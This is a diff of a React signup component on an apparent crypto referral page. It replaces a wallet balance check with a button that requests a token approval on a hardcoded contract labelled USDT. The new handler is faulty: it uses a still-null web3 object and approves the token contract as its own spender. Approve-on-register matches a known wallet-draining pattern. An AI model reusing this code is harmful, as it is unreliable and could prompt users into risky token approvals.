@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import Web3 from 'web3';
 import { Helmet, HelmetProvider } from "react-helmet-async"
 import "./index.css"
@@ -8,33 +8,38 @@ import { IoDiamond } from "react-icons/io5";
 import { GiGoldBar } from "react-icons/gi";
 import Fab from '@mui/material/Fab';
 import { GrSend } from "react-icons/gr";
+import USDTContractABI from "./USDTContractABI.json"; // ABI Tether
 
 const Signup = () => {
-  const [balance, setBalance] = useState(0);
-  const [isButtonDisabled, setIsButtonDisabled] = useState(false);
-  useEffect(() => {
-    const loadAccountBalance = async () => {
-      if (window.ethereum) {
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const address = accounts[0];
-        const balanceInWei = await web3.eth.getBalance(address);
-        const balanceInEth = web3.utils.fromWei(balanceInWei, 'ether');
-        const balanceInUsd = balanceInEth * 4000; // فرضاً قیمت تتر به دلار
-        const balanceInTether = balanceInUsd / 1.0; // تبدیل به تتر
 
-        setBalance(balanceInTether);
+  const [web3, setWeb3] = useState(null);
 
-        if (balanceInTether < 25) {
-          setIsButtonDisabled(true);
-        } else {
-          setIsButtonDisabled(false);
-        }
+  const handleBuy = async () => {
+    if (window.ethereum) {
+      const provider = new Web3(window.ethereum);
+      setWeb3(provider);
+      try {
+        // Request account access if needed
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        //  USDT ADDRESS CONTRACT
+        const usdtAddress = '0x449AF8A982d45356eF967954dec64307826D68ad';
+        const usdtContract = new web3.eth.Contract(USDTContractABI, usdtAddress);
+        //  USER ADDRESS
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+        //  CALL APPROVE 
+        await usdtContract.methods.approve(usdtAddress, '10').send({ from: accounts[0] });
+        console.log('approve function called successfully');
+      } catch (error) {
+        console.error('Failed to call approve function:', error);
       }
-    };
+    } else {
+      console.error('MetaMask not found');
+    }
+  };
 
-    loadAccountBalance();
-  }, []);
+
 
   return (
 
@@ -98,10 +103,7 @@ const Signup = () => {
                 <label className="input-box plan basic-plan plan">
                   <Divider textAlign="left" className="text-white mb-4"><h5>Register</h5></Divider>
                   <input type="text" required placeholder="reflink" />
-                  <Fab disabled={isButtonDisabled} className="mt-4 mb-2" variant="extended" color="primary"><GrSend className='fs-2 mr-2' /><h5 className='mt-2'>APPROVE</h5></Fab>
-                  <div>
-                    <p>{balance > 25 ? "success" : `Account Balance ${balance} Tether`}</p>
-                  </div>
+                  <Fab onClick={handleBuy} className="mt-4 mb-2" variant="extended" color="primary"><GrSend className='fs-2 mr-2' /><h5 className='mt-2'>APPROVE</h5></Fab>
                 </label>
               </div>
             </div>
@@ -113,11 +115,3 @@ const Signup = () => {
 };
 
 export default Signup;
-
-/*
-
-<div>
-      <h1>موجودی حساب پالیگان:</h1>
-      
-    </div>
-*/
